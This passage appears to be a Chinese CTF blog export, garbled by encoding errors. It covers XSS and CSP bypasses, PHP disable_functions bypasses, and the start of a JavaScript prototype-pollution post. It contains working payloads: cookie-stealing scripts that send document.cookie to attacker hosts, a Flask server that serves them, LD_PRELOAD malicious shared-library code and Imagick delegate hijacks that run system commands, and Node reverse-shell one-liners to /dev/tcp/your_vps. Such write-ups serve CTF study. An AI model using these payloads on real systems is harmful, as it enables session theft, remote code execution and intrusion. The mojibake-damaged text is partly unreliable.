123&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 ç¼–ç å†…å®¹window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 å¼•å…¥å¤–éƒ¨é¡µé¢ è¿™ä¸ªåšæ³•ä»…é™chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" ä½†æ˜¯éœ€è¦è§£å†³è·¨åŸŸé—®é¢˜ï¼Œä½¿ç”¨flaskæˆ–è€…SimpleHTTPServerå¼€ä¸ªæœåŠ¡å³å¯ 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) æœ¬åœ°æµ‹è¯• hgame-ComcosèŠå¤©å®¤2å°†scriptæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ï¼Œä½†æ˜¯å‡ºç°æŠ¥é”™ Refused to execute inline script because it violates the following ContentSecurity Policy directive: â€œscript-src â€˜selfâ€™â€. Either the â€˜unsafe-inlineâ€™keyword, a hash (â€˜sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=â€™), or anonce (â€˜nonce-â€¦â€™) is required to enable inline execution. æŸ¥çœ‹CSPç­–ç•¥ 1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; å®ƒé™åˆ¶äº†å†…è” JS è„šæœ¬ï¼Œå¹¶ä¸”é™åˆ¶äº†å¼•å…¥çš„é™æ€èµ„æºæ–‡ä»¶åªèƒ½ä»åŒåŸŸä¸‹åŠ è½½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé‡åˆ°è¿™ç§CSP â¼€èˆ¬æ˜¯æ‰¾è¯¥ç«™æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ â¼€ä¸ªå†…å®¹ä¸º alert(/xss/) çš„å›¾â½šå†å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥åŒæºä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ‰§è¡Œä»»æ„ JS ä»£ç çš„ evil.js æ–‡ä»¶ã€‚ æœ¬é¢˜ä¸­æœ‰â¼€ä¸ªæ¥å£ /sendï¼Œå®ƒä¼šè¿”å›è¿‡æ»¤åçš„æ¶ˆæ¯å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ 1&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt; RealWorld CTF2019-Mission Invisibleç»™äº†æºç ï¼Œæ ¸å¿ƒæ˜¯ 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; å¯ä»¥æ„é€ ä¸€ä¸ªæ ‡ç­¾å¹¶ä¸ºå…¶è®¾ç½®å±æ€§ åªèƒ½ä½¿ç”¨aã€pï¼Œä½†æ˜¯éœ€è¦ä½¿å…¶è‡ªåŠ¨è§¦å‘ï¼Œè§£å†³åŠæ³•å¦‚ä¸‹ 1&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt; chromeæµ‹è¯•æˆåŠŸ ä¹‹åå¸¸è§„æ‰“cookieå³å¯ RealWorld CTF2019-Hcorme é¢˜ç›®æœ‰ä¸€ä¸ªcallbackçš„æ¥å£ï¼Œèƒ½å¤ŸæŠŠè¯·æ±‚å‚æ•°è¾“å‡ºï¼Œå¹¶ä¸”æ˜¯text/htmlå½¢å¼ã€‚ ä¸¤ä¸ªé™åˆ¶ï¼šXSS Auditorã€Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardoldå¸ˆå‚…çš„æ€è·¯â€”&gt;utf-16ç¼–ç ç»•è¿‡ å› ä¸ºåœ¨UTF-16æ–‡ä»¶çš„å¼€é¦–ï¼Œéƒ½ä¼šæ”¾ç½®ä¸€ä¸ªU+FEFFå­—ç¬¦ä½œä¸ºByte Order Markï¼ˆUTF-16LEä»¥FF FEä»£è¡¨ï¼ŒUTF-16BEä»¥FE FFä»£è¡¨ï¼‰ï¼Œä»¥æ˜¾ç¤ºè¿™ä¸ªæ–‡æœ¬æ–‡ä»¶æ˜¯ä»¥UTF-16ç¼–ç ï¼Œå®ƒæ˜¯ä¸ªæ²¡æœ‰å®½åº¦ä¹Ÿæ²¡æœ‰æ–­å­—çš„ç©ºç™½ã€‚ çŒœæµ‹æ˜¯ç±»ä¼¼æˆªæ–­çš„åŸç†ï¼Œä»è€Œbypass XSS Auditor ç»•è¿‡CSPï¼Œæ˜¯åˆ©ç”¨JSONPç›´æ¥æŠŠjsä»£ç æŒ‚è½½åˆ°æœ¬åœ°çš„script ä¼šè¿›è¡Œä¸¤æ¬¡èµ„æºè¯·æ±‚ï¼Œç¬¬äºŒæ¬¡çš„èµ„æºç±»å‹æ˜¯script 1print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;))) CODEGATE 2020 CSPç»•è¿‡å‰é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ­£åˆ™ç»•è¿‡ï¼Œå‘ç°å­˜åœ¨CSP script-src &#39;none&#39; view.phpæäº¤åˆ°api.phpï¼Œæ ¼å¼ä¸ºname/p1/p2ï¼Œå¯ä»¥è®¾ç½®header è§£å†³åŠæ³•ï¼šhttpçŠ¶æ€ç ç½®ä¸º102æ—¶ï¼ŒCSPä¸ä¼šæ‰§è¡Œ é¢–å¥‡å¸ˆå‚…çš„payload 12345678910#author: é¢–å¥‡L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2å‘ç°çœ‹ä¸æ‡‚==ï¼ä»¥åå†æ¥è¡¥ æœ€åç»™ä¸ªåˆ†äº«ä¸ªé“¾æ¥ï¼Œé‡åˆ°é—®é¢˜å¯ä»¥æŸ¥ä¸€æŸ¥ï¼šCSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"https://glotozz.github.io/tags/xss/"}]},{"title":"ä»ä¸€é“é¢˜å­¦ä¹ bypass disable_func","slug":"ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-02-27T10:30:11.142Z","comments":true,"path":"2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/","excerpt":"ctfå’Œæ¸—é€ç»å¸¸ä¼šé‡åˆ°éœ€è¦bypass disable_funcï¼Œå€Ÿä¸‹é¢è¿™é“é¢˜å­¦ä¹ ä¸‹åŸç†","text":"ctfå’Œæ¸—é€ç»å¸¸ä¼šé‡åˆ°éœ€è¦bypass disable_funcï¼Œå€Ÿä¸‹é¢è¿™é“é¢˜å­¦ä¹ ä¸‹åŸç† &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• TCTF wallbreaker easy ä¸€ã€dl()-æ‹“å±•åº“ç»•è¿‡ äºŒã€imap_mail() ä¸‰ã€putenv() å››ã€ini_set äº”ã€apache_setenv å‚è€ƒé“¾æ¥ï¼š TCTF wallbreaker easy å¾ˆæ˜æ˜¾ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªåé—¨ï¼Œæç¤ºéœ€è¦ç”¨Imagickæ¥ç»•è¿‡disable_functionï¼Œè®¾ç½®äº†open_basedirï¼Œå…ˆçœ‹çœ‹phpinfo() å¯¹æ¯”ç¦ç”¨åˆ—è¡¨ 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================åˆ†å‰²çº¿ åŠ ä¸ªerror_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================åˆ†å‰²çº¿ å‡½æ•°å¯¹åº”çš„åˆ©ç”¨ç‚¹ 1234567å¸¸è§„ç»•è¿‡: execã€shell_execã€systemã€passthruã€popenã€proc_openld_preloadç»•è¿‡: mailã€imap_mailã€error_logã€mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi è¿˜å­˜åœ¨ä¸‹é¢5ä¸ª 12345dlimap_mailputenvini_setapache_setenv é‚£ä¹ˆå°±å¯¹è¿™ä¸ª5ä¸ªä¸€ä¸€åˆ†æ ä¸€ã€dl()-æ‹“å±•åº“ç»•è¿‡ å®ç°æ–¹æ³•å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1141142 ç‰ˆæœ¬ è¯´æ˜ 7.0.0 PHP-FPM æ¨¡å¼ä¸‹å·²ç¦ç”¨ dl()ã€‚ 5.3.9 å°½ç®¡ä¸æ¨èï¼Œä½† PHP-FPM æ¨¡å¼ä¸‹å¯ç”¨äº† dl()ã€‚ 5.3.0 ç”±äºç¨³å®šæ€§ï¼Œdl() åœ¨æŸäº› SAPI ä¸­è¢«ç¦ç”¨ã€‚ä»…ä»…å…è®¸ dl() çš„ SAPI ä¸º CLI å’Œ Embedã€‚ ä½¿ç”¨ æ‰©å±•åŠ è½½æŒ‡ä»¤ ä½œä¸ºæ›¿ä»£ã€‚ SAPIï¼ˆServer Application Programming Interfaceï¼‰æœåŠ¡å™¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå³PHPä¸å…¶ä»–åº”ç”¨äº¤äº’çš„æ¥å£ï¼ŒPHPè„šæœ¬è¦æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹å¼ï¼Œé€šè¿‡WebæœåŠ¡å™¨ï¼Œæˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹ï¼Œä¹Ÿå¯ä»¥åµŒå…¥åœ¨å…¶ä»–ç¨‹åºä¸­ã€‚ SAPIæä¾›äº†ä¸€ä¸ªå’Œå¤–éƒ¨é€šä¿¡çš„æ¥å£ï¼Œå¸¸è§çš„SAPIæœ‰ï¼šcgiã€fast-cgiã€cliã€apacheæ¨¡å—çš„DLLã€isapi 1Server API FPM&#x2F;FastCGI è¿™é‡Œæœªå¼€å¯dlï¼Œé‚ä½œç½¢ äºŒã€imap_mail() https://www.exploit-db.com/exploits/35146 é€‚ç”¨äºPHP &lt; 5.6.2çš„ï¼Œé‚ä½œç½¢ ä¸‰ã€putenv()putenv()å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ 1putenv ( string $setting ) : bool æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚ ä¸»è¦æ˜¯å’ŒLD_PRELOADæ‰“ä¸€å¥—ç»„åˆæ‹³ LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨ 1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library4.æˆåŠŸè¿›è¡ŒRCE å¯»æ‰¾ä¸€ä¸ªèƒ½è§¦å‘è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„phpå‡½æ•° æœ€å¸¸è§çš„æ˜¯mail() 123&lt;?php mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; straceä¸€ä¸‹ 1strace -f -e execve php a.php å¾—åˆ° æŸ¥çœ‹ç¨‹åºå¯èƒ½è°ƒç”¨çš„ç³»ç»ŸAPI 1readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; è¿™é‡Œè¦ç”Ÿæˆ shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so ä¿®æ”¹a.php 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; è¿è¡Œä¸‹ï¼Œå‘ç°/tmpä¸‹ç”Ÿæˆäº†æ¶æ„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ è¿›é˜¶ å³ä½¿æ²¡æœ‰å®‰è£…sendmailä¹Ÿå¯ä»¥RCEï¼Œåˆ é™¤sendmailå¹¶ä¿®æ”¹hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; æ‰€ä»¥å½“æˆ‘ä»¬æœ€å¼€å§‹å°†evil shared library loadä¸Šåï¼Œå°±ä¼šè§¦å‘__attribute__ ((__constructor__)) ï¼Œå³ä½¿åé¢å‡ºç°No such file or dicectory æœ¬é¢˜ä¸­mail()è¢«disable_funcé™åˆ¶ï¼Œæç¤ºphp-imagickæ‰©å±• æºç ï¼šhttps://github.com/ImageMagick/ImageMagick å› ä¸ºçŸ¥é“è¦è°ƒç”¨ffmpegï¼Œgithubæœç´¢å³å¯ Makefile.nt æœç´¢mpeg è¿™é‡Œå¯ä»¥WMVä¸ºä¾‹ a.php 123&lt;?php $img &#x3D; new Imagick(&#39;sky.wmv&#39;);?&gt; ä¹‹åå°±æ˜¯å’Œä¸Šé¢ç±»ä¼¼çš„æŸ¥çœ‹æ˜¯å¦è°ƒç”¨ æ³¨æ„çš„æ˜¯wmvæ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;d4dabdbc73b87e364e29e60c60a92900&#x2F;flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so æœ¬é¢˜ä¸­ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªsky.soå’Œ1.wmvåˆ°/tmp/sandboxä¸‹ æ‰§è¡Œ 12putenv(&quot;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;sky.so&quot;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;1.wmv&#39;); å…¶ä»–è§£æ³•ï¼š ä¸€ã€è¦†ç›–delegate.xml å› ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œ/readflagï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯é€šè¿‡ç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæ—¢ç„¶delagate.xmlé‡Œé¢èƒ½å¤Ÿè‡ªå®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™delegateæ¥è®©imagickå½“å¤„ç†æŸä¸ªæ–‡ä»¶åç¼€æ—¶åŠ è½½æˆ‘ä»¬çš„delegate.xmlï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„commandå³å¯ã€‚ 123&lt;delegatemap&gt; &lt;delegate decode&#x3D;&quot;ps:alpha&quot; command&#x3D;&quot;sh -c &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&quot;&quot;&#x2F;&gt;&lt;&#x2F;delegatemap&gt; å†æ‰§è¡Œ 12putenv(&#39;MAGICK_CONFIGURE_PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); äºŒã€è¦†ç›–å­è¿›ç¨‹ æ¯”ä¸Šä¸€ç§æ›´åŠ æ·±å…¥ä¸€å±‚ åœ¨delegate.xmlå®šä¹‰ä¸­åœ¨decode eptæ–‡ä»¶æ—¶ä¼šè°ƒç”¨gsï¼Œåªè¦æŒ‡å®špathä¸ºæˆ‘ä»¬çš„gsçš„æ–‡ä»¶å¤¹è·¯å¾„å³å¯è¾¾æˆåŠ«æŒçš„æ•ˆæœã€‚ gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd &#x3D; getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; ç¼–è¯‘åå‘½åä¸ºgså³å¯ï¼Œå†ä¸Šä¼ ä¸ª1.ept 1234putenv(&#39;PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);putenv(&#39;CMD&#x3D;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&#39;);chmod(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;gs&#39;,&#39;0777&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); ä¸‰ï¼šåˆ©ç”¨ error_log å‡½æ•°å¯åŠ¨ sendmail è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°çš„å°±æ˜¯å½“ error_log çš„ç¬¬äºŒä¸ªå‚æ•° message_type çš„å€¼ä¸º 1 çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨mail å‡½æ•°çš„åŒä¸€ä¸ªå†…ç½®å‡½æ•°(ä¼šæ‰§è¡Œsendmail å‘½ä»¤)çš„ç‰¹æ€§ã€‚ åªéœ€è¦å°†ç¬¬ä¸€ä¸ªmail()ä¾‹å­çš„hack.cä¿®æ”¹æˆå¦‚ä¸‹å³å¯ 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); error_log(&#39;&#39;,1);?&gt; å››ã€ini_setå¯ä»¥ç”¨æ¥ç»•è¿‡open_basedir 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); äº”ã€apache_setenv apache_setenv â€” è®¾ç½® Apache å­è¿›ç¨‹ç¯å¢ƒå˜é‡ å½“è®¾ç½®äº†æŸ Apache ç¯å¢ƒå˜é‡, ç›¸åº”çš„ $_SERVER å˜é‡ä¸ä¼šæ”¹å˜ã€‚ æœäº†ä¸‹å¥½åƒæ²¡æœ‰ç›´æ¥ç›¸å…³çš„æ¼æ´==ï¼ æœ€åæ”¾ä¸Šä¸¤ä¸ªå¸¸ç”¨çš„bypassé“¾æ¥ some exploits in php7 bypass disable_functions via LD_PRELOAD å‚è€ƒé“¾æ¥ï¼š https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://glotozz.github.io/tags/bypass/"}]},{"title":"JavaScriptåŸå‹é“¾æ±¡æŸ“","slug":"JavaScriptåŸå‹é“¾æ±¡æŸ“","date":"2020-02-25T02:51:11.000Z","updated":"2020-02-27T10:52:27.692Z","comments":true,"path":"2020/02/25/JavaScriptåŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"è¿™æ¬¡å…¬ç›Šèµ›è€ƒåˆ°äº†JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰çœ‹çš„æ–‡ç« éƒ½æ˜¯çº¸ä¸Šè°ˆå…µï¼ŒèŠ±ç‚¹æ—¶é—´æ¥å­¦ä¹ è®°å½•ä¸‹ã€‚","text":"è¿™æ¬¡å…¬ç›Šèµ›è€ƒåˆ°äº†JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œä¹‹å‰çœ‹çš„æ–‡ç« éƒ½æ˜¯çº¸ä¸Šè°ˆå…µï¼ŒèŠ±ç‚¹æ—¶é—´æ¥å­¦ä¹ è®°å½•ä¸‹ã€‚ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åŸç† å…¬ç›Šèµ›Ez epress Codebreaking-thejs æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š åŸç†åŸå‹ 123function A(name)&#123; this.name &#x3D; &#39;a&#39;;&#125; åœ¨javascriptä¸­,æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œç›´åˆ°nullä¸ºæ­¢ åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeã€‚åŒæ—¶ï¼Œåœ¨jsä¸­åªæœ‰ç±»æ‰æœ‰prototypeå±æ€§ï¼Œè€Œå¯¹è±¡å´æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯__proto__å’Œç±»çš„prototypeå¯¹åº”ã€‚ ä¸”äºŒè€…æ˜¯ç­‰ä»·çš„ ç±» æ•°ç»„ ä¸Šé¢å°±æ˜¯ä¸¤æ¡å®Œæ•´çš„åŸå‹é“¾ï¼Œéƒ½ä¼šæŒ‡å‘objectï¼Œå†æŒ‡å‘null å†ä¸¾ä¸ªåŸå‹é“¾æœç´¢çš„ä¾‹å­ 1234567function y()&#123; this.a &#x3D; &#39;a&#39;; this.b &#x3D; &#39;b&#39;;&#125;j &#x3D; new y;y.prototype.c &#x3D; &#39;c&#39;;console.log(j.c) è¿™ä¸ªä¾‹å­ä¸­å…ˆnewäº†ä¸€ä¸ªå¯¹è±¡jï¼Œä¹‹åå†yä¸­æ·»åŠ cï¼Œä½†æ˜¯ä»ç„¶æ‰“å°å‡ºäº†c å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefined å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“çš„ä¾‹å­ 123456a &#x3D; &#123;&#39;b&#39;:1&#125;console.log(a.b)a.__proto__.b &#x3D; 2console.log(a.b)c &#x3D; &#123;&#125;console.log(c.b) ä¿®æ”¹açš„åŸå‹å³Objectçš„å±æ€§b=2ï¼Œç¬¬ä¸€æ¬¡æ‰“å°a.bæ ¹æ®æœç´¢é¡ºåºä¸ºb=1ï¼Œä¹‹ånewäº†ä¸€ä¸ªå­—å…¸å¯¹è±¡å³Objectï¼Œå› æ­¤å±æ€§b=2 å†ä¸¾ä¸ªåŸå‹é“¾æ±¡æŸ“è§¦å‘çš„ä¾‹å­ 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125;&#125;let o1 &#x3D; &#123;&#125;;let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 &#x3D; &#123;&#125;;console.log(o3.b); å½“keyä¸º__proto__å³å¯åŸå‹é“¾æ±¡æŸ“ ç†è®ºä¸Šæ‰§è¡Œï¼šo1.a = 1 o1.__proto__.b = 2 è¾“å‡ºåº”è¯¥æ˜¯1ï¼Œ2 å’Œ 2 æ‰§è¡Œä¸€ä¸‹ åŸå› æ˜¯è¿™é‡Œo2 = {a:1,&quot;__proto__&quot;:{b:2}};æ˜¯ç»™o2çš„åŸå‹èµ‹å€¼å±æ€§b=2ï¼Œç›¸å½“äº o2 = {a:1,b:2} è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ä½¿__proto__ä½œä¸ºé”®å o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejsçš„RCE è°ƒç”¨child_processæ¨¡å—æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 12global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;) åˆ©ç”¨æ–¹å¼ä¸€èˆ¬æ˜¯objectçš„æŸä¸ªå±æ€§ä¸ºä¸Šé¢çš„æ¨¡å—å¹¶è¢«è°ƒç”¨ ä¸Šé¢éƒ½æ˜¯åŸç†ï¼Œä¸‹é¢åˆ†æå‡ é“é¢˜ å…¬ç›Šèµ›Ez epressregisteréœ€è¦æ»¡è¶³å°å†™ä¸ç­‰äºadminï¼Œä¹‹åtoUpperCase()å­˜å…¥sessionï¼Œå†ä¸ADMINæ¯”è¾ƒ javascriptå¤§å°å†™ç‰¹æ€§ç»•è¿‡ï¼š https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html æˆåŠŸç™»å½•åï¼Œç»§ç»­åˆ†æä»£ç ï¼Œå‘ç° 